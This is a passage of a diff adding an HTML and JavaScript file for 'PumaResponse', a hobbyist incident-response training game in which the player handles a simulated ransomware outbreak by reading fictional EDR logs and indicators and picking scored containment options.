@@ -1,0 +1,1996 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PumaResponse — Incident Response Simulator</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
+<style>
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+:root {
+  --green: #00ff41;
+  --green-dim: #00aa2b;
+  --green-dark: #003d0e;
+  --amber: #ffb000;
+  --amber-dim: #aa7500;
+  --red: #ff3333;
+  --red-dim: #aa0000;
+  --bg: #020c03;
+  --bg2: #040f05;
+  --border: #00aa2b;
+  --font: 'Share Tech Mono', 'Courier New', monospace;
+
+  --green-bg-ghost: rgba(0,255,65,0.03);
+  --green-bg-faint: rgba(0,255,65,0.04);
+  --green-bg-dim:   rgba(0,255,65,0.06);
+
+  --green-glow-xs:  rgba(0,255,65,0.05);
+  --green-glow-sm:  rgba(0,255,65,0.08);
+  --green-glow-md:  rgba(0,255,65,0.15);
+  --green-glow:     rgba(0,255,65,0.18);
+  --green-glow-lg:  rgba(0,255,65,0.25);
+  --green-glow-xl:  rgba(0,255,65,0.35);
+  --green-glow-max: rgba(0,255,65,0.4);
+
+  --red-bg-dim:   rgba(255,51,51,0.06);
+  --red-bg-soft:  rgba(255,51,51,0.08);
+  --red-bg-md:    rgba(255,51,51,0.12);
+  --red-vignette: rgba(255,51,51,0.38);
+  --red-glow:     rgba(255,51,51,0.5);
+
+  --amber-bg-faint: rgba(255,176,0,0.04);
+  --amber-bg-dim:   rgba(255,176,0,0.08);
+  --amber-glow-sm:  rgba(255,176,0,0.4);
+  --amber-glow:     rgba(255,176,0,0.5);
+
+  --backdrop-sm:   rgba(0,8,2,0.85);
+  --backdrop-md:   rgba(0,8,2,0.88);
+  --backdrop-lg:   rgba(0,8,2,0.92);
+  --backdrop-dark: rgba(0,0,0,0.9);
+
+  --surface-sm: rgba(0,20,5,0.5);
+  --surface-md: rgba(0,30,8,0.4);
+  --surface-lg: rgba(0,50,10,0.3);
+
+  --crt-scanline: rgba(0,0,0,0.08);
+  --crt-vignette: rgba(0,0,0,0.5);
+
+  --z-crt:     10000;
+  --z-screen:   9000;
+  --z-overlay:   600;
+  --z-modal:     500;
+}
+
+html, body {
+  width: 100%; height: 100%;
+  background: var(--bg);
+  color: var(--green);
+  font-family: var(--font);
+  font-size: 14px;
+  overflow: hidden;
+  user-select: none;
+}
+
+/* CRT Overlay */
+body::before {
+  content: '';
+  position: fixed; top: 0; left: 0; right: 0; bottom: 0;
+  background: repeating-linear-gradient(0deg, transparent, transparent 2px, var(--crt-scanline) 2px, var(--crt-scanline) 4px);
+  pointer-events: none;
+  z-index: var(--z-crt);
+}
+body::after {
+  content: '';
+  position: fixed; top: 0; left: 0; right: 0; bottom: 0;
+  background: radial-gradient(ellipse at center, transparent 60%, var(--crt-vignette) 100%);
+  pointer-events: none;
+  z-index: calc(var(--z-crt) + 1);
+}
+
+@keyframes fadeIn { to { opacity: 1; } }
+@keyframes blink { 0%,100%{opacity:1} 50%{opacity:0} }
+@keyframes pulse-dot {
+  0%,100% { opacity: 1; box-shadow: 0 0 4px var(--green); }
+  50% { opacity: 0.4; box-shadow: none; }
+}
+@keyframes modal-in {
+  from { transform: scale(0.97); opacity: 0; }
+  to { transform: scale(1); opacity: 1; }
+}
+@keyframes pulse-amber {
+  0%,100% { box-shadow: 0 0 4px var(--amber), 0 0 8px rgba(255,176,0,0.3); }
+  50% { box-shadow: 0 0 8px var(--amber), 0 0 18px rgba(255,176,0,0.5); }
+}
+@keyframes slide-up {
+  from { transform: translateY(20px); opacity: 0; }
+  to { transform: translateY(0); opacity: 1; }
+}
+@keyframes typing-cursor {
+  0%,100% { border-right-color: var(--green); }
+  50% { border-right-color: transparent; }
+}
+
+/* ===================== BOOT SCREEN ===================== */
+#boot-screen {
+  position: fixed; inset: 0;
+  background: var(--bg);
+  z-index: var(--z-screen);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  flex-direction: column;
+  padding: 40px;
+}
+.logo-ascii {
+  font-size: 13px;
+  letter-spacing: 0;
+  color: var(--green);
+  text-shadow: 0 0 8px var(--green), 0 0 20px var(--green-glow-max);
+  line-height: 1.2;
+  margin-bottom: 12px;
+  white-space: pre;
+  font-family: var(--font);
+  text-align: left;
+}
+.logo-sub {
+  font-size: 13px;
+  letter-spacing: 3px;
+  color: var(--green-dim);
+  text-align: center;
+}
+#boot-log {
+  width: 560px;
+  max-width: 90vw;
+}
+.boot-line {
+  display: flex;
+  justify-content: space-between;
+  margin: 2px 0;
+  opacity: 0;
+  animation: fadeIn 0.1s ease forwards;
+}
+.boot-line .ok { color: var(--green); }
+.boot-line .warn { color: var(--amber); }
+.boot-line .fail { color: var(--red); }
+.boot-line .label { color: var(--green-dim); }
+#boot-prompt {
+  margin-top: 20px;
+  color: var(--green);
+  animation: blink 1s step-end infinite;
+  font-size: 16px;
+  text-shadow: 0 0 8px var(--green);
+}
+
+/* ===================== GAME LAYOUT ===================== */
+#game-screen {
+  display: none;
+  width: 100vw;
+  height: 100vh;
+  height: 100dvh;
+  flex-direction: column;
+  overflow: hidden;
+}
+#game-screen.visible { display: flex; }
+
+/* Header */
+#header {
+  display: flex;
+  align-items: center;
+  gap: 0;
+  border-bottom: 1px solid var(--border);
+  padding: 4px 8px;
+  background: var(--bg2);
+  flex-shrink: 0;
+  height: 38px;
+}
+#header-title {
+  color: var(--green);
+  font-size: 15px;
+  font-weight: bold;
+  text-shadow: 0 0 8px var(--green);
+  margin-right: 12px;
+  letter-spacing: 2px;
+}
+.header-stat {
+  margin-right: 16px;
+  color: var(--green-dim);
+  font-size: 13px;
+}
+.header-stat span { color: var(--green); }
+.header-stat span.warn { color: var(--amber); }
+.header-stat span.crit { color: var(--red); }
+.header-spacer { flex: 1; }
+
+#about-btn {
+  width: 26px;
+  height: 26px;
+  border: 1px solid var(--amber);
+  border-radius: 3px;
+  background: transparent;
+  color: var(--amber);
+  font-family: var(--font);
+  font-size: 14px;
+  font-weight: bold;
+  cursor: pointer;
+  margin-right: 10px;
+  animation: pulse-amber 2s ease-in-out infinite;
+  flex-shrink: 0;
+}
+#about-btn:hover {
+  background: var(--amber);
+  color: var(--bg);
+  text-shadow: none;
+}
+#about-modal {
+  display: none;
+  position: fixed;
+  inset: 0;
+  background: rgba(0,0,0,0.75);
+  z-index: var(--z-overlay);
+  align-items: center;
+  justify-content: center;
+  padding: 20px;
+}
+#about-modal.visible { display: flex; }
+#about-modal-inner {
+  background: var(--bg);
+  border: 1px solid var(--amber);
+  box-shadow: 0 0 30px rgba(255,176,0,0.15), inset 0 0 60px rgba(0,0,0,0.5);
+  max-width: 600px;
+  width: 100%;
+  padding: 24px 28px;
+  animation: modal-in 0.3s ease both;
+}
+#about-modal-inner h2 {
+  color: var(--amber);
+  font-size: 16px;
+  letter-spacing: 2px;
+  margin-bottom: 16px;
+  text-shadow: 0 0 8px var(--amber-glow-sm);
+}
+#about-modal-inner p {
+  color: var(--green-dim);
+  font-size: 14px;
+  line-height: 1.7;
+  margin-bottom: 14px;
+}
+#about-modal-inner p:last-of-type { margin-bottom: 20px; }
+#about-close-btn {
+  display: block;
+  margin: 0 auto;
+  padding: 6px 24px;
+  border: 1px solid var(--amber);
+  background: transparent;
+  color: var(--amber);
+  font-family: var(--font);
+  font-size: 13px;
+  cursor: pointer;
+  letter-spacing: 1px;
+}
+#about-close-btn:hover { background: var(--amber); color: var(--bg); }
+#phase-indicator {
+  font-size: 12px;
+  letter-spacing: 1px;
+  color: var(--amber);
+  text-shadow: 0 0 6px var(--amber-glow-sm);
+  margin-right: 12px;
+}
+
+/* Progress bar */
+#phase-progress-bar {
+  height: 2px;
+  background: var(--green-dark);
+  width: 100%;
+  flex-shrink: 0;
+}
+#phase-progress-fill {
+  height: 100%;
+  background: var(--green);
+  transition: width 0.5s ease;
+  width: 0%;
+}
+
+/* Main 3-column layout */
+#main {
+  display: grid;
+  grid-template-columns: 340px 1fr 300px;
+  grid-template-rows: 1fr;
+  flex: 1;
+  overflow: hidden;
+  position: relative;
+}
+#right-panel {
+  cursor: pointer;
+  z-index: 10;
+  position: relative;
+  background: var(--bg);
+}
+#main.siem-expanded #right-panel {
+  position: absolute;
+  top: 0;
+  right: 0;
+  bottom: 0;
+  width: 50%;
+  box-shadow: -4px 0 20px rgba(0,0,0,0.6);
+  background: var(--bg);
+}
+#siem-overlay {
+  display: none;
+  position: fixed;
+  top: 0; left: 0; right: 0; bottom: 0;
+  background: rgba(0,0,0,0.5);
+  z-index: 9;
+  cursor: pointer;
+}
+#main.siem-expanded ~ #siem-overlay {
+  display: block;
+}
+
+.panel {
+  border-right: 1px solid var(--border);
+  display: flex;
+  flex-direction: column;
+  overflow: hidden;
+}
+.panel:last-child { border-right: none; }
+.panel-title {
+  padding: 4px 8px;
+  border-bottom: 1px solid var(--border);
+  color: var(--green-dim);
+  font-size: 12px;
+  letter-spacing: 1px;
+  flex-shrink: 0;
+  background: var(--bg2);
+  display: flex;
+  align-items: center;
+  gap: 6px;
+  margin: 0;
+  font-weight: normal;
+}
+.panel-title-dot {
+  width: 6px; height: 6px;
+  border-radius: 50%;
+  background: var(--green);
+  animation: pulse-dot 2s ease-in-out infinite;
+}
+.panel-title-dot.amber { background: var(--amber); }
+.panel-title-dot.red { background: var(--red); animation: pulse-dot 1s ease-in-out infinite; }
+
+.panel-body {
+  flex: 1;
+  overflow-y: auto;
+  padding: 8px;
+}
+.panel-body::-webkit-scrollbar { width: 4px; }
+.panel-body::-webkit-scrollbar-track { background: var(--bg); }
+.panel-body::-webkit-scrollbar-thumb { background: var(--border); }
+
+/* ===================== LEFT PANEL: INCIDENT BRIEF ===================== */
+.incident-meta {
+  border-bottom: 1px solid var(--green-dark);
+  padding-bottom: 8px;
+  margin-bottom: 8px;
+}
+.meta-row {
+  display: flex;
+  justify-content: space-between;
+  margin: 3px 0;
+  font-size: 13px;
+}
+.meta-label { color: var(--green-dim); }
+.meta-val { color: var(--green); }
+.meta-val.high { color: var(--red); text-shadow: 0 0 4px var(--red); }
+.meta-val.medium { color: var(--amber); }
+.meta-val.low { color: var(--green); }
+
+.section-title {
+  color: var(--green);
+  font-size: 12px;
+  letter-spacing: 1px;
+  margin: 10px 0 6px;
+  border-bottom: 1px solid var(--green-dark);
+  padding-bottom: 3px;
+}
+
+.ioc-list {
+  font-size: 12px;
+  color: var(--green-dim);
+  line-height: 1.6;
+}
+.ioc-item {
+  padding: 2px 0;
+  border-left: 2px solid var(--green-dark);
+  padding-left: 6px;
+  margin: 2px 0;
+}
+.ioc-item .ioc-type { color: var(--amber); font-size: 11px; letter-spacing: 1px; }
+.ioc-item .ioc-val { color: var(--green); font-size: 12px; word-break: break-all; }
+
+/* IR Phase tracker */
+.ir-phases {
+  display: flex;
+  flex-direction: column;
+  gap: 2px;
+  margin-top: 8px;
+}
+.ir-phase-row {
+  display: flex;
+  align-items: center;
+  gap: 6px;
+  font-size: 12px;
+  padding: 3px 6px;
+}
+.ir-phase-icon {
+  width: 8px; height: 8px;
+  border: 1px solid var(--green-dark);
+  flex-shrink: 0;
+}
+.ir-phase-row.completed .ir-phase-icon {
+  background: var(--green);
+  border-color: var(--green);
+  box-shadow: 0 0 4px var(--green);
+}
+.ir-phase-row.active .ir-phase-icon {
+  background: var(--amber);
+  border-color: var(--amber);
+  animation: blink 1s step-end infinite;
+}
+.ir-phase-row.active { color: var(--amber); }
+.ir-phase-row.completed { color: var(--green-dim); }
+.ir-phase-row.pending { color: var(--green-dark); }
+
+/* Score tracker */
+.score-tracker {
+  margin-top: 10px;
+  border-top: 1px solid var(--green-dark);
+  padding-top: 8px;
+}
+.score-row {
+  display: flex;
+  justify-content: space-between;
+  font-size: 12px;
+  margin: 2px 0;
+}
+.score-label { color: var(--green-dim); }
+.score-val { color: var(--green); }
+.score-val.warn { color: var(--amber); }
+.score-val.crit { color: var(--red); }
+
+/* ===================== CENTER PANEL: ACTION AREA ===================== */
+#action-panel {
+  display: flex;
+  flex-direction: column;
+  overflow: hidden;
+}
+
+.narrative-box {
+  padding: 10px 12px;
+  font-size: 13px;
+  line-height: 1.6;
+  color: var(--green);
+  border-bottom: 1px solid var(--green-dark);
+  margin-bottom: 8px;
+  background: var(--green-bg-ghost);
+}
+.narrative-box .narrator {
+  color: var(--amber);
+  font-size: 11px;
+  letter-spacing: 2px;
+  margin-bottom: 4px;
+}
+
+.evidence-box {
+  border: 1px solid var(--green-dark);
+  padding: 8px 10px;
+  margin-bottom: 8px;
+  background: var(--surface-sm);
+  font-size: 12px;
+  line-height: 1.5;
+}
+.evidence-box .ev-title {
+  color: var(--amber);
+  font-size: 11px;
+  letter-spacing: 1px;
+  margin-bottom: 4px;
+}
+.evidence-box pre {
+  color: var(--green-dim);
+  font-family: var(--font);
+  font-size: 12px;
+  white-space: pre-wrap;
+  word-break: break-all;
+}
+.evidence-box .log-line { color: var(--green-dim); }
+.evidence-box .log-highlight { color: var(--red); text-shadow: 0 0 3px var(--red-glow); }
+.evidence-box .log-warn { color: var(--amber); }
+.evidence-box .log-ok { color: var(--green); }
+
+/* Choice buttons */
+.choices-container {
+  display: flex;
+  flex-direction: column;
+  gap: 6px;
+  margin-top: 8px;
+}
+.choice-btn {
+  display: block;
+  width: 100%;
+  background: var(--surface-sm);
+  border: 1px solid var(--green-dark);
+  color: var(--green);
+  font-family: var(--font);
+  font-size: 13px;
+  padding: 10px 12px;
+  cursor: pointer;
+  text-align: left;
+  transition: border-color 0.15s, background 0.15s;
+  line-height: 1.5;
+}
+.choice-btn:hover {
+  border-color: var(--green);
+  background: var(--green-bg-dim);
+  box-shadow: 0 0 8px var(--green-glow-sm);
+}
+.choice-btn:active { transform: scale(0.99); }
+.choice-btn .choice-key {
+  color: var(--amber);
+  font-size: 12px;
+  margin-right: 6px;
+}
+.choice-btn .choice-label { color: var(--green); }
+.choice-btn .choice-desc {
+  display: block;
+  color: var(--green-dim);
+  font-size: 12px;
+  margin-top: 3px;
+  padding-left: 24px;
+}
+.choice-btn.selected {
+  border-color: var(--green);
+  background: var(--green-bg-dim);
+}
+.choice-btn:disabled {
+  opacity: 0.4;
+  cursor: not-allowed;
+}
+
+/* Outcome display */
+.outcome-box {
+  border: 1px solid var(--amber-dim);
+  padding: 10px 12px;
+  margin-top: 10px;
+  background: var(--amber-bg-faint);
+  animation: slide-up 0.2s ease;
+}
+.outcome-box.good {
+  border-color: var(--green-dim);
+  background: var(--green-bg-faint);
+}
+.outcome-box.bad {
+  border-color: var(--red-dim);
+  background: var(--red-bg-dim);
+}
+.outcome-title {
+  font-size: 12px;
+  letter-spacing: 1px;
+  margin-bottom: 4px;
+}
+.outcome-title.good { color: var(--green); }
+.outcome-title.bad { color: var(--red); }
+.outcome-title.neutral { color: var(--amber); }
+.outcome-text {
+  font-size: 13px;
+  color: var(--green-dim);
+  line-height: 1.5;
+}
+.outcome-score {
+  margin-top: 6px;
+  font-size: 12px;
+}
+.outcome-score .pos { color: var(--green); }
+.outcome-score .neg { color: var(--red); }
+
+.continue-btn {
+  display: block;
+  width: 100%;
+  background: none;
+  border: 1px solid var(--green);
+  color: var(--green);
+  font-family: var(--font);
+  font-size: 14px;
+  padding: 8px 12px;
+  cursor: pointer;
+  margin-top: 12px;
+  letter-spacing: 1px;
+  text-shadow: 0 0 6px var(--green);
+  transition: background 0.1s, color 0.1s;
+}
+.continue-btn:hover { background: var(--green); color: var(--bg); text-shadow: none; }
+.continue-btn:active { transform: scale(0.98); }
+
+/* ===================== RIGHT PANEL: SIEM / LOGS ===================== */
+.siem-entry {
+  padding: 1px 0;
+  line-height: 1.45;
+  font-size: 12px;
+  overflow: hidden;
+  text-overflow: ellipsis;
+  white-space: nowrap;
+  opacity: 0;
+  animation: fadeIn 0.15s ease forwards;
+  flex-shrink: 0;
+}
+.siem-time { color: var(--green-dim); opacity: 0.6; }
+.siem-info { color: var(--green-dim); }
+.siem-warn { color: var(--amber); }
+.siem-crit { color: var(--red); text-shadow: 0 0 4px var(--red); }
+.siem-success { color: var(--green); }
+
+.notes-section {
+  border-top: 1px solid var(--green-dark);
+  margin-top: 8px;
+  padding-top: 8px;
+}
+.note-entry {
+  font-size: 12px;
+  color: var(--green-dim);
+  padding: 3px 0;
+  border-left: 2px solid var(--green-dark);
+  padding-left: 6px;
+  margin: 3px 0;
+  line-height: 1.4;
+}
+.note-entry .note-phase { color: var(--amber); font-size: 11px; }
+
+/* ===================== RIGHT PANEL: SIEM & NOTES ===================== */
+#right-panel { border-right: none; border-left: 1px solid var(--border); }
+#main.siem-expanded #right-panel .siem-entry {
+  white-space: normal;
+  text-overflow: unset;
+}
+#main.siem-expanded #right-panel .note-entry {
+  white-space: normal;
+}
+#right-panel-body {
+  display: flex;
+  flex-direction: column;
+  flex: 1;
+  overflow: hidden;
+  padding: 0;
+}
+#siem-feed-col {
+  flex: 1;
+  overflow-y: auto;
+  padding: 6px 8px;
+  min-height: 0;
+}
+#siem-feed-col::-webkit-scrollbar { width: 4px; }
+#siem-feed-col::-webkit-scrollbar-track { background: var(--bg); }
+#siem-feed-col::-webkit-scrollbar-thumb { background: var(--border); }
+#notes-col {
+  flex-shrink: 0;
+  max-height: 40%;
+  overflow-y: auto;
+  border-top: 1px solid var(--green-dark);
+  padding: 6px 8px;
+}
+#notes-col::-webkit-scrollbar { width: 4px; }
+#notes-col::-webkit-scrollbar-track { background: var(--bg); }
+#notes-col::-webkit-scrollbar-thumb { background: var(--border); }
+
+/* ===================== END SCREEN ===================== */
+#end-screen {
+  display: none;
+  position: fixed;
+  inset: 0;
+  background: var(--backdrop-dark);
+  z-index: var(--z-overlay);
+  align-items: center;
+  justify-content: center;
+  flex-direction: column;
+  padding: 20px;
+}
+#end-screen.visible { display: flex; }
+
+@keyframes overlay-in {
+  from { opacity: 0; transform: scale(0.95); }
+  to   { opacity: 1; transform: scale(1); }
+}
+#end-screen.visible > * {
+  animation: overlay-in 0.4s cubic-bezier(0.22,1,0.36,1) both;
+}
+#end-screen.visible > *:nth-child(2) { animation-delay: 0.05s; }
+#end-screen.visible > *:nth-child(3) { animation-delay: 0.1s; }
+#end-screen.visible > *:nth-child(4) { animation-delay: 0.15s; }
+#end-screen.visible > *:nth-child(5) { animation-delay: 0.2s; }
+
+.end-title {
+  font-size: 32px;
+  letter-spacing: 4px;
+  margin-bottom: 16px;
+}
+.end-title.success { color: var(--green); text-shadow: 0 0 20px var(--green); }
+.end-title.partial { color: var(--amber); text-shadow: 0 0 20px var(--amber); }
+.end-title.failure { color: var(--red); text-shadow: 0 0 20px var(--red); }
+
+.end-subtitle {
+  color: var(--green-dim);
+  font-size: 14px;
+  margin-bottom: 20px;
+  text-align: center;
+  max-width: 500px;
+  line-height: 1.5;
+}
+
+.scorecard {
+  width: 440px;
+  max-width: 90vw;
+  border: 1px solid var(--border);
+  padding: 12px 16px;
+  margin-bottom: 16px;
+}
+.scorecard-title {
+  color: var(--green-dim);
+  letter-spacing: 2px;
+  font-size: 12px;
+  margin-bottom: 10px;
+}
+.sc-row {
+  display: flex;
+  justify-content: space-between;
+  margin: 4px 0;
+  font-size: 13px;
+  color: var(--green-dim);
+}
+.sc-row .sc-val { color: var(--green); }
+.sc-row .sc-val.warn { color: var(--amber); }
+.sc-row .sc-val.crit { color: var(--red); }
+.sc-section {
+  font-size: 11px;
+  letter-spacing: 1px;
+  color: var(--green-dark);
+  border-top: 1px solid var(--green-dark);
+  padding-top: 5px;
+  margin: 8px 0 4px;
+}
+.sc-total {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  border-top: 1px solid var(--border);
+  margin-top: 10px;
+  padding-top: 10px;
+}
+.sc-grade {
+  font-size: 42px;
+  font-weight: bold;
+  line-height: 1;
+}
+.sc-grade.green { color: var(--green); text-shadow: 0 0 16px var(--green); }
+.sc-grade.amber { color: var(--amber); text-shadow: 0 0 16px var(--amber); }
+.sc-grade.red { color: var(--red); text-shadow: 0 0 16px var(--red); }
+.sc-grade-label {
+  font-size: 13px;
+  letter-spacing: 1px;
+  color: var(--green);
+}
+
+.overlay-btn {
+  margin-top: 16px;
+  background: none;
+  border: 1px solid var(--green);
+  color: var(--green);
+  font-family: var(--font);
+  font-size: 15px;
+  padding: 8px 24px;
+  cursor: pointer;
+  text-shadow: 0 0 6px var(--green);
+  letter-spacing: 1px;
+  transition: background 0.1s, color 0.1s;
+}
+.overlay-btn:hover { background: var(--green); color: var(--bg); text-shadow: none; }
+.overlay-btn:active { transform: scale(0.97); }
+
+/* ===================== RESPONSIVE ===================== */
+@media (max-width: 900px) {
+  #main { grid-template-columns: 1fr; grid-template-rows: 1fr; }
+  #left-panel { display: none; }
+  #right-panel { display: none; }
+  #action-panel { grid-column: 1; }
+}
+
+@media (prefers-reduced-motion: reduce) {
+  *, *::before, *::after {
+    animation-duration: 0.01ms !important;
+    animation-iteration-count: 1 !important;
+  }
+}
+
+:focus-visible {
+  outline: 1px solid var(--green);
+  outline-offset: 2px;
+  box-shadow: 0 0 6px var(--green-glow-xl);
+}
+</style>
+</head>
+<body>
+
+<!-- BOOT SCREEN -->
+<div id="boot-screen">
+  <div style="text-align:center; margin-bottom:30px;">
+    <div class="logo-ascii" role="img" aria-label="PumaResponse"> ____  _   _ __  __    _    ____  _____ ____  ____   ___  _   _ ____  _____
+|  _ \| | | |  \/  |  / \  |  _ \| ____/ ___||  _ \ / _ \| \ | / ___|| ____|
+| |_) | | | | |\/| | / _ \ | |_) |  _| \___ \| |_) | | | |  \| \___ \|  _|
+|  __/| |_| | |  | |/ ___ \|  _ &lt;| |___ ___) |  __/| |_| | |\  |___) | |___
+|_|    \___/|_|  |_/_/   \_\_| \_\_____|____/|_|    \___/|_| \_|____/|_____|</div>
+    <div class="logo-sub">MANAGED SECURITY SERVICES  //  INCIDENT RESPONSE PLATFORM v1.0.0</div>
+  </div>
+  <div id="boot-log"></div>
+  <div id="boot-prompt" style="display:none">▋ PRESS ANY KEY TO BEGIN SHIFT</div>
+</div>
+
+<!-- GAME SCREEN -->
+<div id="game-screen">
+  <div id="header">
+    <div id="header-title">PUMARESPONSE</div>
+    <div class="header-stat">TICKET: <span id="hdr-ticket">--</span></div>
+    <div class="header-stat">SEVERITY: <span id="hdr-severity">--</span></div>
+    <div class="header-stat">ELAPSED: <span id="hdr-elapsed">00:00</span></div>
+    <div class="header-spacer"></div>
+    <div id="phase-indicator">INITIALIZING...</div>
+    <button id="about-btn" title="About">?</button>
+  </div>
+  <div id="phase-progress-bar"><div id="phase-progress-fill"></div></div>
+
+  <div id="main">
+    <!-- LEFT: Incident Brief -->
+    <div id="left-panel" class="panel">
+      <div class="panel-title"><div class="panel-title-dot"></div> INCIDENT BRIEF</div>
+      <div class="panel-body" id="incident-brief"></div>
+    </div>
+
+    <!-- CENTER: Actions -->
+    <div id="action-panel" class="panel">
+      <div class="panel-title"><div class="panel-title-dot amber"></div> RESPONSE ACTIONS</div>
+      <div class="panel-body" id="action-body"></div>
+    </div>
+
+    <!-- RIGHT: SIEM Feed & Analyst Notes -->
+    <div id="right-panel" class="panel">
+      <div class="panel-title"><div class="panel-title-dot"></div> SIEM FEED</div>
+      <div class="panel-body" id="right-panel-body">
+        <div id="siem-feed-col"></div>
+        <div id="notes-col"></div>
+      </div>
+    </div>
+  </div>
+  <div id="siem-overlay"></div>
+</div>
+
+<!-- ABOUT MODAL -->
+<div id="about-modal">
+  <div id="about-modal-inner">
+    <h2>// ABOUT PUMARESPONSE</h2>
+    <p>After launching my vibecoding career with PumaSOC, I decided to see if I could make a companion game where instead of being the Operations lead, you played as one of the analysts.</p>
+    <p>The idea was simple - various incident scenarios with branching paths that gave you better or worse results. At higher levels, incidents would be related, requiring the player to recognize a pattern and infer a deeper issue that could then be tracked down in a threat hunt.</p>
+    <p>While developing this game, I started to realize I was actually building an incident-response mindset training simulator, as actual experienced handlers would easily know which of three static options to choose from.</p>
+    <p>I think there is something here that could be useful and/or entertaining for people wanting to get into incident handling, but I don't know anybody who ever wanted to get into forensics so they could be an MSSP analyst.</p>
+    <button id="about-close-btn">[CLOSE]</button>
+  </div>
+</div>
+
+<!-- END SCREEN -->
+<div id="end-screen">
+  <div class="end-title" id="end-title"></div>
+  <div class="end-subtitle" id="end-subtitle"></div>
+  <div class="scorecard" id="end-scorecard"></div>
+  <div id="end-debrief" style="max-width:500px;text-align:center;color:var(--green-dim);font-size:13px;line-height:1.6;margin-bottom:8px;"></div>
+  <button class="overlay-btn" onclick="location.reload()">NEW INCIDENT</button>
+</div>
+
+<script>
+// ═══════════════════════════════════════════════════
+// PUMARESPONSE — Incident Response Simulator
+// ═══════════════════════════════════════════════════
+
+const $ = id => document.getElementById(id);
+
+// ── BOOT SEQUENCE ──────────────────────────────────
+const BOOT_LINES = [
+  ['Initializing PumaResponse MSSP Platform...', 'ok', '[ OK ]'],
+  ['Loading SIEM connectors...', 'ok', '[ OK ]'],
+  ['Connecting to Sentinel / Splunk / Elastic...', 'ok', '[ OK ]'],
+  ['Loading threat intelligence feeds...', 'ok', '[ OK ]'],
+  ['Syncing MITRE ATT&CK framework v14.1...', 'ok', '[ OK ]'],
+  ['Loading incident playbooks...', 'ok', '[ OK ]'],
+  ['Checking analyst certifications...', 'warn', '[ WARN ]'],
+  ['Establishing customer VPN tunnels...', 'ok', '[ OK ]'],
+  ['Pulling EDR telemetry...', 'ok', '[ OK ]'],
+  ['Loading forensic toolkit...', 'ok', '[ OK ]'],
+  ['Verifying chain-of-custody protocols...', 'ok', '[ OK ]'],
+  ['MSSP shift handoff received — 1 incident in queue', 'warn', '[ ALERT ]'],
+];
+
+let bootIdx = 0;
+function runBoot() {
+  if (bootIdx < BOOT_LINES.length) {
+    const [text, cls, tag] = BOOT_LINES[bootIdx];
+    const div = document.createElement('div');
+    div.className = 'boot-line';
+    div.innerHTML = `<span class="label">${text}</span><span class="${cls}">${tag}</span>`;
+    $('boot-log').appendChild(div);
+    bootIdx++;
+    setTimeout(runBoot, 120 + Math.random() * 180);
+  } else {
+    $('boot-prompt').style.display = 'block';
+  }
+}
+
+let bootDone = false;
+document.addEventListener('keydown', function bootKey(e) {
+  if (bootIdx < BOOT_LINES.length) return;
+  if (bootDone) return;
+  bootDone = true;
+  document.removeEventListener('keydown', bootKey);
+  $('boot-screen').style.display = 'none';
+  startGame();
+});
+$('boot-screen').addEventListener('click', function() {
+  if (bootIdx < BOOT_LINES.length) return;
+  if (bootDone) return;
+  bootDone = true;
+  $('boot-screen').style.display = 'none';
+  startGame();
+});
+
+setTimeout(runBoot, 400);
+
+// ── INCIDENT SCENARIOS ─────────────────────────────
+const INCIDENTS = [
+  {
+    id: 'RANSOMWARE',
+    title: 'Ransomware Outbreak — LOCKBIT 3.0',
+    client: 'Meridian Financial Group',
+    severity: 'CRITICAL',
+    sevClass: 'high',
+    ticketId: 'IR-2024-0847',
+    assignedTime: '03:42 UTC',
+    summary: 'Multiple endpoints reporting encrypted files with .lockbit extension. Ransom note detected on 3 file servers. AD environment may be compromised.',
+    iocs: [
+      { type: 'FILE HASH', val: 'a3b5c7d9e1f2...4a8b (SHA256) — LockBit payload' },
+      { type: 'IP', val: '185.220.101.34 — C2 callback' },
+      { type: 'IP', val: '91.243.44.12 — exfil staging' },
+      { type: 'FILE', val: 'restore-my-files.txt — ransom note' },
+      { type: 'PROCESS', val: 'svchost_update.exe — masquerading' },
+    ],
+    phases: [
+      { // TRIAGE
+        name: 'TRIAGE',
+        narrative: 'You receive the handoff at 03:42 UTC. The client\'s helpdesk is panicking — three file servers are showing ransom notes and users are reporting they can\'t open files. The night shift SOC analyst flagged it as "suspicious encryption activity" 47 minutes ago but didn\'t escalate.',
+        evidence: {
+          title: 'INITIAL ALERT — EDR TELEMETRY',
+          content: `<span class="log-warn">[03:01:14]</span> <span class="log-highlight">ALERT</span> CrowdStrike — svchost_update.exe executed on FS-PROD-01
+<span class="log-warn">[03:01:18]</span> Process injection detected: svchost_update.exe → lsass.exe
+<span class="log-warn">[03:02:44]</span> <span class="log-highlight">CRITICAL</span> Mass file modification: 847 files renamed (.lockbit ext)
+<span class="log-warn">[03:03:01]</span> Lateral movement: SMB connection FS-PROD-01 → FS-PROD-02
+<span class="log-warn">[03:04:12]</span> <span class="log-highlight">CRITICAL</span> Ransom note dropped: C:\\restore-my-files.txt
+<span class="log-warn">[03:05:33]</span> Network beacon: 185.220.101.34:443 (every 60s)
+<span class="log-warn">[03:12:00]</span> <span class="log-highlight">ALERT</span> FS-PROD-03 — encryption activity detected
+<span class="log-warn">[03:47:00]</span> SOC handoff — incident assigned to you`
+        },
+        choices: [
+          {
+            key: 'A',
+            label: 'Immediately isolate all affected hosts via EDR',
+            desc: 'Network-isolate FS-PROD-01, 02, 03 through CrowdStrike. Fast but may alert the attacker.',
+            quality: 'good',
+            score: { time: 10, containment: 25, evidence: 5, thoroughness: 5 },
+            outcome: 'Hosts isolated within 2 minutes via EDR network containment. Encryption stops on isolated systems. The C2 beacon is severed. Some evidence of lateral movement preserved in memory.',
+          },
+          {
+            key: 'B',
+            label: 'Review logs first to understand full scope before acting',
+            desc: 'Spend 15-20 minutes analyzing SIEM data and EDR telemetry to map the blast radius.',
+            quality: 'partial',
+            score: { time: -15, containment: -10, evidence: 15, thoroughness: 15 },
+            outcome: 'You identify 2 additional compromised workstations and the initial access vector (phishing email to jsmith@meridian.com). However, during analysis, encryption spreads to a 4th file server and the attacker begins staging data for exfiltration.',
+          },
+          {
+            key: 'C',
+            label: 'Call the client IT team and ask them to pull network cables',
+            desc: 'Have the client physically disconnect affected servers from the network.',
